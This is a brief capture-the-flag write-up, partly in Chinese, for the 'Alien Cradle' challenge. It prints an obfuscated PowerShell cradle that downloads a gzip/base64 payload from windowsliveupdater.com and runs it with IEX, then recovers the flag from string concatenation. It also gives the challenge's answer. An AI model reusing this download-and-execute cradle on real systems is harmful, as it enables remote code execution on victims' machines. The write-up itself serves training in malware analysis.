# Alien Cradle

:::note CHALLENGE DESCRIPTION

Difficulty: VERY EASY

In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora's close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?

为了获取更多关于遗迹的信息，外星人发动了一场袭击，目标是潘多拉的密友和合作伙伴，因为他们可能掌握着有关遗迹的秘密情报。在最近一起被怀疑是他们操纵的事件中，潘多拉从事件日志中发现了一个奇怪的PowerShell脚本，也称为PowerShell“摇篮”。这些脚本通常用于下载并执行攻击的下一阶段。然而，这个脚本似乎经过了混淆，潘多拉无法理解它。你能帮她去混淆吗？

:::

附件为一份 Powershell 脚本

```powershell
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};
$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));
$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

从中就能得到 flag

```shell
PowerShell 7.4.1
PS C:\Users\Randark> 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}'
HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
```

```plaintext title="Flag"
HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
```
